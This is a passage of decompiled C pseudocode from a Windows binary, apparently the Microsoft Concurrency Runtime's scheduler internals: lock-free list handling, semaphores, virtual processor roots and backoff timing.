    return (PSLIST_ENTRY)sub_44EDA1((int)a2);
  sub_45B5A0((int)a2);
  return InterlockedPushEntrySList(v2, a2 + 1);
}

//----- (00451A65) --------------------------------------------------------
int __thiscall sub_451A65(volatile signed __int32 *this)
{
  _InterlockedDecrement(this + 97);
  return (*(int (__thiscall **)(volatile signed __int32 *))(*this + 20))(this);
}

//----- (00451A84) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_451A84(int this, struct _SINGLE_LIST_ENTRY *a2, char a3)
{
  if ( a3 )
    (*(void (__thiscall **)(_DWORD, struct _SINGLE_LIST_ENTRY *))(**(_DWORD **)(this + 428) + 12))(
      *(_DWORD *)(this + 428),
      a2);
  _InterlockedDecrement((volatile signed __int32 *)(this + 400));
  return InterlockedPushEntrySList((PSLIST_HEADER)(this + 488), a2 + 2);
}

//----- (00451ACE) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_451ACE(int this, int a2)
{
  union _SLIST_HEADER *v3; // edi
  int DepthSList; // edx
  PSLIST_ENTRY result; // eax

  v3 = (union _SLIST_HEADER *)(this + 504);
  DepthSList = QueryDepthSList((PSLIST_HEADER)(this + 504));
  result = (PSLIST_ENTRY)(32 * *(_DWORD *)(this + 20));
  if ( DepthSList < (int)result )
    return InterlockedPushEntrySList(v3, (PSLIST_ENTRY)(a2 + 12));
  if ( a2 )
    return (PSLIST_ENTRY)(**(int (__thiscall ***)(int, int))a2)(a2, 1);
  return result;
}

//----- (00451B1E) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_451B1E(union _SLIST_HEADER *this)
{
  union _SLIST_HEADER *v1; // esi
  PSLIST_ENTRY result; // eax
  struct _SINGLE_LIST_ENTRY *i; // ebx
  PSLIST_ENTRY v4; // ebx

  v1 = this;
  result = InterlockedPopEntrySList(this + 64);
  for ( i = result != 0 ? &result[-2] : 0; i; i = v4 != 0 ? &v4[-2] : 0 )
  {
    (*(void (__thiscall **)(_DWORD, struct _SINGLE_LIST_ENTRY *))(**(_DWORD **)&v1[53].Depth + 12))(
      *(_DWORD *)&v1[53].Depth,
      i);
    v1 = this;
    sub_451A84((int)this, i, 0);
    v4 = InterlockedPopEntrySList(this + 64);
    result = v4 - 2;
  }
  return result;
}

//----- (00451B88) --------------------------------------------------------
BOOL __thiscall sub_451B88(HANDLE *this, LONG lReleaseCount)
{
  BOOL result; // eax

  if ( lReleaseCount > 0 )
    return ReleaseSemaphore(this[95], lReleaseCount, 0);
  return result;
}

//----- (00451BA6) --------------------------------------------------------
int __thiscall sub_451BA6(int *this, int a2)
{
  int result; // eax

  *(_DWORD *)(*(_DWORD *)(a2 + 4) + 8) = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(*(_DWORD *)(a2 + 8) + 4) = *(_DWORD *)(a2 + 4);
  result = *this;
  if ( a2 == *this )
  {
    if ( result == *(_DWORD *)(result + 4) )
      result = 0;
    else
      result = *(_DWORD *)(result + 8);
    *this = result;
  }
  return result;
}

//----- (00451BD8) --------------------------------------------------------
char __thiscall sub_451BD8(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 1;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && (*(_DWORD *)(*(_DWORD *)&ListHead[4].Depth + 404) & 0xA0000000) != -1610612736
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_451340(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_44FD17,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (00451CD1) --------------------------------------------------------
char __thiscall sub_451CD1(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 13;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && (*(_DWORD *)(*(_DWORD *)&ListHead[4].Depth + 404) & 0xA0000000) != -1610612736
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_451340(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_44FD23,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (00451DCA) --------------------------------------------------------
int __thiscall sub_451DCA(int *this)
{
  int result; // eax
  int v2; // esi

  result = *this;
  if ( *this )
  {
    v2 = *(_DWORD *)(result + 4);
    if ( result == v2 )
    {
      *this = 0;
    }
    else
    {
      *(_DWORD *)(*(_DWORD *)(v2 + 4) + 8) = result;
      *(_DWORD *)(*this + 4) = *(_DWORD *)(v2 + 4);
    }
    return v2;
  }
  return result;
}

//----- (00451DF2) --------------------------------------------------------
_DWORD *__thiscall sub_451DF2(_DWORD *this)
{
  _DWORD *result; // eax
  _DWORD *v2; // esi

  result = (_DWORD *)*this;
  if ( *this )
  {
    v2 = (_DWORD *)*result;
    if ( result == (_DWORD *)*result )
    {
      *this = 0;
    }
    else
    {
      *(_DWORD *)(*v2 + 4) = result;
      *(_DWORD *)*this = *v2;
    }
    return v2;
  }
  return result;
}

//----- (00451E16) --------------------------------------------------------
_DWORD *__thiscall sub_451E16(int this)
{
  volatile signed __int32 *v2; // esi
  _DWORD *v3; // edi

  v2 = (volatile signed __int32 *)(this + 4);
  sub_44A220((volatile signed __int32 *)(this + 4));
  v3 = sub_451DF2((_DWORD *)this);
  sub_44A33A(v2);
  return v3;
}

//----- (00451E4A) --------------------------------------------------------
void __thiscall sub_451E4A(int this, int a2)
{
  volatile signed __int32 *v3; // edi

  v3 = (volatile signed __int32 *)(this + 308);
  sub_44A220((volatile signed __int32 *)(this + 308));
  if ( *(_DWORD *)(a2 + 12) == 2 )
    sub_451BA6((int *)(this + 304), a2);
  *(_DWORD *)(a2 + 12) = 0;
  sub_44A33A(v3);
}

//----- (00451E86) --------------------------------------------------------
char __thiscall sub_451E86(union _SLIST_HEADER *this, int a2)
{
  return sub_451CD1(this + 12, (struct _SINGLE_LIST_ENTRY *)a2, *(_DWORD *)(a2 + 24), 1);
}

//----- (00451E9E) --------------------------------------------------------
char __thiscall sub_451E9E(_DWORD *this)
{
  char result; // al

  result = sub_45AB89(this);
  this[14] = 0;
  return result;
}

//----- (00451EAC) --------------------------------------------------------
int __thiscall sub_451EAC(_DWORD *this, int a2, unsigned int a3)
{
  int result; // eax
  unsigned int v4; // ebx
  int v5; // edi
  int v6; // eax
  int v7; // eax
  int (__thiscall ***v8)(_DWORD); // ebx
  int v9; // edi
  int v10; // eax
  char v11[4]; // [esp+0h] [ebp-1Ch] BYREF
  char pExceptionObject[4]; // [esp+4h] [ebp-18h] BYREF
  int v13; // [esp+8h] [ebp-14h]
  int (*v14)(); // [esp+Ch] [ebp-10h]
  _DWORD *v15; // [esp+10h] [ebp-Ch]
  unsigned int v16; // [esp+14h] [ebp-8h]
  int (__thiscall ***v17)(_DWORD); // [esp+18h] [ebp-4h]

  result = a2;
  v15 = this;
  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"ppVirtualProcessorRoots");
LABEL_17:
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !a3 )
  {
    sub_42E473(pExceptionObject, (int)"count");
    goto LABEL_17;
  }
  v4 = 0;
  v16 = 0;
  do
  {
    v5 = this[8];
    v17 = *(int (__thiscall ****)(_DWORD))(result + 4 * v4);
    v6 = (**v17)(v17);
    v7 = sub_457F3A(*(_DWORD **)(v5 + 4 * v6), (int)v17);
    if ( !v7 )
    {
      v8 = v17;
      do
      {
        v13 = 0;
        v14 = sub_44AE9C;
        while ( sub_449592((int)v11) )
          ;
        SwitchToThread();
        v9 = v15[8];
        v10 = (**v8)(v8);
        v7 = sub_457F3A(*(_DWORD **)(v9 + 4 * v10), (int)v8);
      }
      while ( !v7 );
      v4 = v16;
    }
    if ( !*(_BYTE *)(v7 + 172) || (v7 = sub_458BC0(*(volatile signed __int32 **)(v7 + 176), v7)) != 0 )
      sub_45750E((_BYTE *)v7);
    result = a2;
    ++v4;
    this = v15;
    v16 = v4;
  }
  while ( v4 < a3 );
  return result;
}
// 451EAC: using guessed type char var_1C[4];
// 451EAC: using guessed type char pExceptionObject[4];

//----- (00451F9C) --------------------------------------------------------
signed __int32 __thiscall sub_451F9C(volatile signed __int32 *this)
{
  volatile signed __int32 *v2; // ebx
  int v3; // esi
  signed __int32 result; // eax
  signed __int32 v5; // edx

  v2 = this + 101;
  v3 = sub_452146((int *)this + 101, 0x80000000);
  result = _InterlockedCompareExchange(v2, v3 & 0x7FFFFFFF, v3);
  if ( result != v3 )
  {
    do
    {
      v5 = result;
      result = _InterlockedCompareExchange(v2, result & 0x7FFFFFFF, result);
    }
    while ( result != v5 );
  }
  _InterlockedIncrement(this + 98);
  return result;
}

//----- (00451FE3) --------------------------------------------------------
char *__cdecl sub_451FE3(char *ListEntry)
{
  if ( ListEntry[772] )
    _InterlockedDecrement(&dword_500044);
  if ( QueryDepthSList(&ListHead) >= 0x10u )
    return sub_44F76D(ListEntry, 1);
  else
    return (char *)InterlockedPushEntrySList(&ListHead, (PSLIST_ENTRY)ListEntry);
}
// 500044: using guessed type int dword_500044;

//----- (00452024) --------------------------------------------------------
LPVOID sub_452024()
{
  if ( dword_4F807C >= 0 )
    return 0;
  else
    return sub_44AAC3(dword_500038);
}
// 4F807C: using guessed type int dword_4F807C;

//----- (00452040) --------------------------------------------------------
char __thiscall sub_452040(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // esi
  signed __int32 v2; // edx

  v1 = this + 96;
  while ( *v1 )
  {
    v2 = *v1;
    if ( _InterlockedCompareExchange(v1, v2 + 1, v2) == v2 )
      return 1;
  }
  return 0;
}

//----- (00452062) --------------------------------------------------------
int __thiscall sub_452062(_DWORD *this, int a2, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  int (__thiscall ***v6)(_DWORD, int, int); // edi

  v4 = sub_44AAC3(dword_500038);
  v5 = v4;
  if ( v4 && (_DWORD *)sub_43E90F(v4) == this )
    v6 = (int (__thiscall ***)(_DWORD, int, int))sub_45341D(v5);
  else
    v6 = (int (__thiscall ***)(_DWORD, int, int))this[44];
  return (**v6)(v6, a2, a3);
}

//----- (004520B3) --------------------------------------------------------
int __thiscall sub_4520B3(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4)
{
  _DWORD *v5; // eax
  _DWORD *v6; // esi
  void *v7; // eax

  v5 = sub_44AAC3(dword_500038);
  v6 = v5;
  if ( v5 && (_DWORD *)sub_43E90F(v5) == this )
    v7 = (void *)sub_45341D(v6);
  else
    v7 = (void *)this[44];
  return sub_45AC31(v7, a2, a3, a4);
}

//----- (004520F0) --------------------------------------------------------
void __thiscall sub_4520F0(_DWORD *this, int a2)
{
  if ( this[3] == 1 )
    this[94] = sub_450A15(this, *(_DWORD *)(a2 + 184));
}

//----- (00452115) --------------------------------------------------------
int __cdecl sub_452115(int *a1, int a2)
{
  int result; // eax
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  result = *a1;
  if ( (*a1 & a2) != 0 )
  {
    v4 = 0;
    v5 = sub_44AE5E;
    do
    {
      sub_449592((int)v3);
      result = *a1;
    }
    while ( (*a1 & a2) != 0 );
  }
  return result;
}
// 452115: using guessed type char var_10[8];

//----- (00452146) --------------------------------------------------------
int __cdecl sub_452146(int *a1, int a2)
{
  int v2; // edx
  char v4[8]; // [esp+4h] [ebp-10h] BYREF
  int v5; // [esp+Ch] [ebp-8h]
  void (*v6)(); // [esp+10h] [ebp-4h]

  v2 = *a1;
  if ( (a2 & *a1) != a2 )
  {
    v5 = 0;
    v6 = sub_44AE5E;
    do
    {
      sub_449592((int)v4);
      v2 = *a1;
    }
    while ( (a2 & *a1) != a2 );
  }
  return v2;
}
// 452146: using guessed type char var_10[8];

//----- (00452180) --------------------------------------------------------
char __thiscall sub_452180(unsigned int *this, int a2, int a3, int a4, int a5, int a6)
{
  int v8[4]; // [esp-14h] [ebp-1Ch] BYREF
  int v9; // [esp-4h] [ebp-Ch]

  v9 = 3;
  sub_452901(v8, &a3);
  return sub_4521A6(this, a2, v8[0], v8[1], v8[2], v8[3], v9);
}

//----- (004521A6) --------------------------------------------------------
char __thiscall sub_4521A6(unsigned int *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  char v8; // bl
  int v10[4]; // [esp-14h] [ebp-28h] BYREF
  int v11; // [esp-4h] [ebp-18h]
  __int32 v12[3]; // [esp+8h] [ebp-Ch] BYREF

  v8 = 0;
  sub_4538D4();
  v11 = a7;
  v12[0] = 0;
  sub_452901(v10, &a3);
  if ( sub_450458(this, v12, v10[0], v10[1], v10[2], v10[3], v11) )
  {
    sub_4571AD((_DWORD **)v12[1], v12[0], a2, 0);
    v12[0] = 0;
    v8 = 1;
  }
  sub_4538D4();
  return v8;
}
// 4538D4: using guessed type int sub_4538D4(void);

//----- (004521FB) --------------------------------------------------------
char *sub_4521FB()
{
  char *result; // eax

  result = (char *)sub_44AE22(&dword_500058);
  if ( !--dword_500040 )
  {
    sub_456E11();
    while ( 1 )
    {
      result = (char *)InterlockedPopEntrySList(&ListHead);
      if ( !result )
        break;
      sub_44F76D(result, 1);
    }
  }
  dword_500058 = 0;
  return result;
}
// 500040: using guessed type int dword_500040;
// 500058: using guessed type int dword_500058;

//----- (00452251) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_452251(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4)
{
  union _SLIST_HEADER *v4; // esi
  int v5; // edi
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int v7; // esi
  struct _SINGLE_LIST_ENTRY *v8; // eax
  _DWORD *v9; // eax
  int v10; // edx
  int v11; // eax
  int v12; // ecx
  int v13; // ebx
  int v14; // edx
  int v15; // ecx
  union _SLIST_HEADER *result; // eax
  struct _SINGLE_LIST_ENTRY *v17; // eax
  struct _SINGLE_LIST_ENTRY *v18; // edi
  int v19; // edx
  struct _SINGLE_LIST_ENTRY *v20; // eax
  int v21; // ecx
  _DWORD *v23; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]

  v4 = this;
  v5 = 0;
  for ( i = 0; v5 < *(_DWORD *)&v4[5].Depth; i = v5 )
  {
    Next = v4[4].Next.Next[v5].Next;
    if ( Next && (int)Next[30].Next > 0 )
    {
      v7 = 0;
      v8 = Next + 14;
      do
      {
        v9 = (_DWORD *)sub_44F5A7(v8, v7);
        v23 = v9;
        if ( v9 )
        {
          v10 = v9[26] - v9[28];
          v9[28] = v9[26];
          v11 = v9[27];
          v12 = v11 - v23[29];
          v23[29] = v11;
          *a3 += v10;
          *a2 += v12;
          a4->Next.Next = (struct _SINGLE_LIST_ENTRY *)((char *)a4->Next.Next + v10 - v12);
        }
        ++v7;
        v8 = Next + 14;
      }
      while ( v7 < (int)Next[30].Next );
      v4 = this;
      v5 = i;
    }
    ++v5;
  }
  v13 = 0;
  v14 = *(_DWORD *)&v4[55].Depth - *(_DWORD *)&v4[56].Depth;
  *(_DWORD *)&v4[56].Depth = *(_DWORD *)&v4[55].Depth;
  v15 = (char *)v4[56].Next.Next - (char *)v4[57].Next.Next;
  v4[57].Next.Next = v4[56].Next.Next;
  *a3 += v14;
  *a2 += v15;
  result = a4;
  a4->Next.Next = (struct _SINGLE_LIST_ENTRY *)((char *)a4->Next.Next + v14 - v15);
  if ( (int)v4[33].Next.Next > 0 )
  {
    result = v4 + 25;
    do
    {
      v17 = (struct _SINGLE_LIST_ENTRY *)sub_44F5A7(result, v13);
      v18 = v17;
      if ( v17 )
      {
        v19 = (char *)v17[2].Next - (char *)v17[4].Next;
        v20 = v17[3].Next;
        v18[4].Next = v18[2].Next;
        v21 = (char *)v20 - (char *)v18[5].Next;
        v18[5].Next = v20;
        *a3 += v19;
        *a2 += v21;
        a4->Next.Next = (struct _SINGLE_LIST_ENTRY *)((char *)a4->Next.Next + v19 - v21);
        if ( !sub_4513C0(v18) )
        {
          sub_451BD8(v4 + 25, v18, (int)v18->Next, 0);
          sub_44775B(v18);
        }
      }
      ++v13;
      result = v4 + 25;
    }
    while ( v13 < (int)v4[33].Next.Next );
  }
  return result;
}

//----- (0045238D) --------------------------------------------------------
int __thiscall sub_45238D(volatile signed __int32 *this)
{
  _BYTE *v2; // eax
  int v3; // eax
  int result; // eax
  signed __int32 v5; // eax
  signed __int32 v6; // edx
  char v7; // [esp+Bh] [ebp-1h]

  v2 = sub_44AAC3(dword_500038);
  v7 = 1;
  if ( v2 && !v2[76] )
  {
    v7 = 0;
    UserMathErrorFunction();
  }
  v3 = (*(int (__thiscall **)(volatile signed __int32 *))(*this + 72))(this);
  if ( v3 )
  {
    if ( v3 == 2 && !*((_DWORD *)this + 102) )
      _InterlockedExchange(this + 102, 1);
    v5 = *((_DWORD *)this + 101);
    do
    {
      v6 = v5;
      v5 = _InterlockedCompareExchange(this + 101, v5 & 0xBFFFFFFF, v5);
    }
    while ( v5 != v6 );
    result = sub_451B88((HANDLE *)this, v5 & 0x1FFFFFFF);
  }
  else
  {
    result = sub_45174E((int)this);
  }
  if ( !v7 )
    return UserMathErrorFunction();
  return result;
}

//----- (00452429) --------------------------------------------------------
char __thiscall sub_452429(_DWORD *this)
{
  char result; // al
  volatile signed __int32 *v3; // ebx
  struct _SINGLE_LIST_ENTRY *i; // eax
  char v5; // dl
  char v6; // al
  volatile signed __int32 v7; // ecx
  int v8; // esi
  unsigned int v9; // esi
  int TickCount64; // eax
  ULONG v11; // eax
  int v12[4]; // [esp-14h] [ebp-3Ch] BYREF
  int v13; // [esp-4h] [ebp-2Ch]
  int v14[6]; // [esp+Ch] [ebp-1Ch] BYREF
  char v15; // [esp+26h] [ebp-2h]
  char v16; // [esp+27h] [ebp-1h]

  result = 0;
  v3 = this + 121;
  if ( (int)this[121] <= 0 )
    return result;
  v16 = 0;
  v15 = 0;
  for ( i = (struct _SINGLE_LIST_ENTRY *)sub_450810((int)this, 0);
        ;
        i = (struct _SINGLE_LIST_ENTRY *)sub_450810((int)this, 0) )
  {
    if ( !i )
    {
      v5 = v16;
      v6 = 1;
      v15 = 1;
      goto LABEL_10;
    }
    v5 = sub_45146D((int)this, i) | v16;
    v16 = v5;
    if ( (int)this[110] <= 0 )
      break;
    if ( sub_452598(this, 1) )
    {
      v5 = v16;
      break;
    }
  }
  v6 = v15;
LABEL_10:
  if ( !this[102] && (v6 || (int)this[110] > 0) )
    goto LABEL_17;
  v7 = *v3;
  result = _InterlockedExchangeAdd(v3, -*v3) != v7;
  if ( !result )
  {
    if ( !this[102] )
      return result;
    if ( v5 )
      return result;
    v13 = 11;
    v8 = *(_DWORD *)(sub_4509F4(this) + 8);
    memset(v14, 0, 16);
    sub_452901(v12, v14);
    result = sub_4521A6(this, v8, v12[0], v12[1], v12[2], v12[3], v13);
    if ( result )
      return result;
LABEL_17:
    _InterlockedExchange(v3, 1);
  }
  v9 = sub_452598(this, 1);
  TickCount64 = j____crtGetTickCount64();
  v11 = TickCount64 - this[116] < v9 ? v9 - (TickCount64 - this[116]) : 0;
  if ( v15 )
  {
    if ( v11 < 0x1F4 )
      v11 = 500;
  }
  return sub_44FC46(this, v11);
}
// 44A95D: using guessed type int j____crtGetTickCount64(void);

//----- (0045253F) --------------------------------------------------------
char __stdcall sub_45253F(int a1, _DWORD *a2, int a3)
{
  return sub_452429(a2);
}

//----- (0045254E) --------------------------------------------------------
char __stdcall sub_45254E(_DWORD *a1, int a2)
{
  return sub_452429(a1);
}

//----- (0045255D) --------------------------------------------------------
void __stdcall Callback(_DWORD *a1, BOOLEAN a2)
{
  unsigned int v2; // esi
  unsigned int v3; // eax

  v2 = sub_452598(a1, 1);
  v3 = j____crtGetTickCount64() - a1[116];
  if ( v3 >= v2 )
    sub_452429(a1);
  else
    sub_44FC46(a1, v2 - v3);
}
// 44A95D: using guessed type int j____crtGetTickCount64(void);

//----- (00452598) --------------------------------------------------------
int __thiscall sub_452598(_DWORD *this, int a2)
{
  unsigned int v2; // eax
  unsigned int v3; // ecx
  unsigned int v5; // eax
  int v6; // eax

  v2 = this[100];
  v3 = this[115];
  if ( v2 < v3 )
    return 0;
  v5 = v2 - v3;
  if ( v5 >= 0x64 )
  {
    if ( v5 >= 0x12C )
    {
      if ( v5 >= 0x258 )
      {
        if ( v5 >= 0x5DC )
        {
          if ( v5 >= 0x9C4 )
          {
            if ( v5 >= 0xFA0 )
              v6 = (v5 >> 1) + 8200;
            else
              v6 = v5 / 3 + 2500;
          }
          else
          {
            v6 = v5 / 3 + 555;
          }
        }
        else
        {
          v6 = (v5 >> 2) + 180;
        }
      }
      else
      {
        v6 = v5 / 5 + 60;
      }
    }
    else
    {
      v6 = (v5 >> 3) + 15;
    }
  }
  else
  {
    v6 = v5 / 0xA + 5;
  }
  return a2 * v6;
}

//----- (0045262F) --------------------------------------------------------
int __cdecl sub_45262F(char a1, char a2, int a3)
{
  int result; // eax
  _DWORD v4[16]; // [esp+4h] [ebp-40h] BYREF

  if ( dword_500098 )
  {
    memset((char *)v4 + 2, 0, 0x3Eu);
    v4[11] = 0x20000;
    LOWORD(v4[0]) = 64;
    LOBYTE(v4[1]) = a1;
    BYTE1(v4[1]) = a2;
    v4[6] = dword_493F7C[0];
    v4[7] = dword_493F7C[1];
    v4[8] = dword_493F7C[2];
    v4[9] = dword_493F7C[3];
    v4[13] = a3;
    return sub_456D33(dword_500098, dword_500090, dword_500094, (int)v4);
  }
  return result;
}
// 493F7C: using guessed type _DWORD dword_493F7C[4];
// 500090: using guessed type int dword_500090;
// 500094: using guessed type int dword_500094;

//----- (0045269A) --------------------------------------------------------
int __stdcall sub_45269A(char a1, unsigned __int8 a2, int a3)
{
  int result; // eax

  if ( a2 <= (unsigned __int8)byte_50008C )
  {
    result = dword_500088;
    if ( (dword_500088 & 1) != 0 )
      return sub_45262F(a1, a2, a3);
  }
  return result;
}
// 500088: using guessed type int dword_500088;
// 50008C: using guessed type char byte_50008C;

//----- (004526C4) --------------------------------------------------------
int __thiscall sub_4526C4(int this, _DWORD *a2)
{
  _DWORD *v3; // edi

  v3 = (_DWORD *)(this + 324);
  sub_44AE12((volatile __int32 *)(this + 324));
  if ( *a2 != *(_DWORD *)(this + 336) )
    sub_4517EB((volatile signed __int32 *)this);
  return sub_44AE53(v3);
}

//----- (004526F9) --------------------------------------------------------
int __thiscall sub_4526F9(_DWORD *this)
{
  if ( sub_450560(this) || sub_45058A(this) )
    return 1;
  if ( (int)this[121] <= 0 )
    return 0;
  return 2;
}

//----- (00452727) --------------------------------------------------------
int __thiscall sub_452727(_DWORD *this, int a2)
{
  if ( a2 == -1 )
  {
    this[85] = 0;
    this[86] = sub_44FF50(this);
  }
  else
  {
    this[85] = a2;
  }
  if ( this[85] == this[86] )
    return 0;
  else
    return this[86];
}

//----- (0045276F) --------------------------------------------------------
unsigned int __thiscall sub_45276F(_DWORD *this)
{
  unsigned int v2; // ecx
  unsigned int result; // eax

  v2 = sub_44FF50(this);
  if ( v2 <= this[86] )
    return 0;
  if ( this[86] == this[85] )
    result = v2;
  else
    result = 0;
  this[86] = v2;
  return result;
}

//----- (004527A1) --------------------------------------------------------
char __thiscall sub_4527A1(volatile signed __int32 *this, int a2)
{
  volatile signed __int32 *v3; // esi
  signed __int32 v4; // eax
  int v5; // edx

  if ( (_BYTE)a2 )
  {
    v3 = this + 101;
    v4 = *((_DWORD *)this + 101);
    while ( 1 )
    {
      v5 = v4;
      if ( (v4 & 0x40000000) != 0 )
        v5 = sub_452115((int *)this + 101, 0x40000000);
      if ( (v5 & 0x20000000) != 0 )
        break;
      v4 = _InterlockedCompareExchange(v3, v5 + 1, v5);
      if ( v4 == v5 )
      {
        (*(void (__thiscall **)(volatile signed __int32 *, int, signed __int32))(*this + 68))(
          this,
          a2,
          _InterlockedIncrement(this + 108));
        return 1;
      }
    }
    return 0;
  }
  else
  {
    (*(void (__thiscall **)(volatile signed __int32 *, _DWORD, signed __int32))(*this + 68))(
      this,
      0,
      _InterlockedDecrement(this + 108));
    if ( (_InterlockedDecrement(this + 101) & 0x9FFFFFFF) == 0x80000000 )
      sub_44FBE5(this);
    return 1;
  }
}

//----- (00452855) --------------------------------------------------------
int __thiscall sub_452855(int this, char a2)
{
  volatile signed __int32 *v3; // ecx

  sub_4538D4();
  v3 = (volatile signed __int32 *)(this + 404);
  if ( a2 )
  {
    if ( (_InterlockedDecrement(v3) & 0x9FFFFFFF) == 0x80000000 )
      sub_44FBE5((volatile signed __int32 *)this);
  }
  else if ( (_InterlockedIncrement(v3) & 0x40000000) != 0 )
  {
    WaitForSingleObjectEx(*(HANDLE *)(this + 380), 0xFFFFFFFF, 0);
  }
  return sub_4538D4();
}
// 4538D4: using guessed type int sub_4538D4(void);

//----- (004528B2) --------------------------------------------------------
void __thiscall sub_4528B2(int *this)
{
  int v2; // eax
  int i; // ebx
  _DWORD *v4; // eax
  _DWORD *v5; // esi

  if ( this[1] > 0 )
  {
    v2 = *this;
    for ( i = 0; i < *this; ++i )
    {
      v4 = *(_DWORD **)(this[2] + 4 * i);
      if ( v4 )
      {
        do
        {
          v5 = (_DWORD *)*v4;
          sub_44775B(v4);
          v4 = v5;
        }
        while ( v5 );
      }
      v2 = *this;
    }
    this[1] = 0;
    memset((void *)this[2], 0, 4 * v2);
  }
}

//----- (00452901) --------------------------------------------------------
int __thiscall sub_452901(int *this, _DWORD *a2)
{
  int result; // eax

  *this ^= (*this ^ *a2) & 0xFFFFFFF;
  *this = *a2 ^ (*this ^ *a2) & 0xFFFFFFF;
  this[2] = a2[2];
  this[1] = a2[1];
  result = a2[3];
  this[3] = result;
  return result;
}

//----- (00452958) --------------------------------------------------------
char *__thiscall sub_452958(char *this, int a2)
{
  sub_405BE0(this, a2);
  *(_DWORD *)this = &Concurrency::improper_lock::`vftable';
  return this;
}
// 493910: using guessed type void *Concurrency::improper_lock::`vftable';

//----- (004529A6) --------------------------------------------------------
char *__thiscall sub_4529A6(char *this, int a2)
{
  sub_405BE0(this, a2);
